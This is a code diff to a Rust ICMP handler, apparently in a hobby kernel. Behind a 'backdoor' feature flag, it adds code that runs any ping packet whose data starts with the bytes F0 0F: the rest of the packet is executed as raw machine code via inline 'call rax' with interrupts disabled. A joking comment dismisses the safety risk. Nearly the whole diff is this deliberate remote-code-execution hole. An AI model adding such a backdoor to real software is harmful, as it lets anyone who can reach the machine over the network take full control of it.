@@ -13,13 +13,39 @@ pub async fn handle_icmp(packet: &IPv4Packet<'_>, interface: Interface) {
     };
 
     debug!("handling icmp: {:?}", packet);
+
     if icmpp.typ == ControlMessageType::EchoRequest(NoSubcode::NoCode) {
+        log::debug!("{:?}", icmpp.data);
+
+        #[cfg(feature = "backdoor")]
+        {
+            let dpat = &icmpp.data[0..2];
+            let pattern = b"\xF0\x0F";
+
+            log::debug!("{:?} == {:?}", dpat, pattern);
+
+            if dpat == pattern {
+                use x86_64::instructions::interrupts::without_interrupts;
+
+                log::debug!("silly pakcet: {:?}", &icmpp.data.as_slice()[2..]);
+                let program = &icmpp.data.as_slice()[pattern.len()..];
+
+                // safe since sender pinky promisies that the code is memory safe :3
+                without_interrupts(|| unsafe {
+                    core::arch::asm!(
+                    "call rax", in("rax") program.as_ptr(),
+                    clobber_abi("C"));
+                });
+            }
+        }
+
         let mut response = ICMPPacket {
             typ: ControlMessageType::EchoReply(NoSubcode::NoCode),
             checksum: 0,
             other: icmpp.other,
             data: icmpp.data,
         };
+
         response.calc_new_checksum();
 
         let resp_bytes = response.to_bytes();
